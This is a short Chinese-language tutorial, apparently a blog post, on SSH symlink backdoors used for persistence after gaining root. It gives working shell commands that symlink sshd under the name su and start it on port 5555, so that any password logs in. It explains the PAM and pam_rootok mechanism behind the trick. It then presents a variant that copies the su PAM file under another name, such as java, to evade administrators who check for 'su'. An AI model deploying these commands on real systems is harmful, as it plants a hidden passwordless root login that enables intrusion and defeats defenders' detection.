## SSH软链接后门-旧

SSH 软链接后门是一个比较好用的持久化技术，无论是通过root权限下的RCE还是定时任务写shell时都能完美驾驭。这种后门是一种万能登录后门，输入任意密码即可登录。下面是一个典型的SSH软链接后门部署命令。

```shell
ln -sf /usr/sbin/sshd /tmp/su;
/tmp/su -oPort=5555
```

也正是由于这样好用，因此已经被用烂了，运维人员只需要检查开放端口内有没有关键词su即可八九不离十的找到后门。

那么能不能创建出其他SSH软链接后门但是文件名不是su呢。答案是肯定的。

SSH软链接后门的实现原理与Linux的PAM认证相关。具体来说，PAM认证是通过软链接的文件名（如：/tmp/su,/home/su），在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)。而在sshd服务配置满足”启用PAM认证“且”PAM配置文件中控制标志为sufficient“的前提下，只要pam_rootok模块检测uid为0（root）就会自动放行认证（我们平时以root权限su其他用户时不用输密码就切换完成了,就是这样的原理）。将这两方面特点结合起来我们就能构造出其他的软链接后门。

## SSH软链接后门-新

```shell
cp /etc/pam.d/su /etc/pam.d/java
#cp /etc/pam.d/su postgres

ln -sf /usr/sbin/sshd /java;
#ln -sf /usr/sbin/sshd /postgres;

/java -oPort=5555
#/postgres -oPort=5555


cp /etc/pam.d/su /etc/pam.d/java
ln -sf /usr/sbin/sshd /java;
/java -oPort=5555
```

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-12_161119.png)

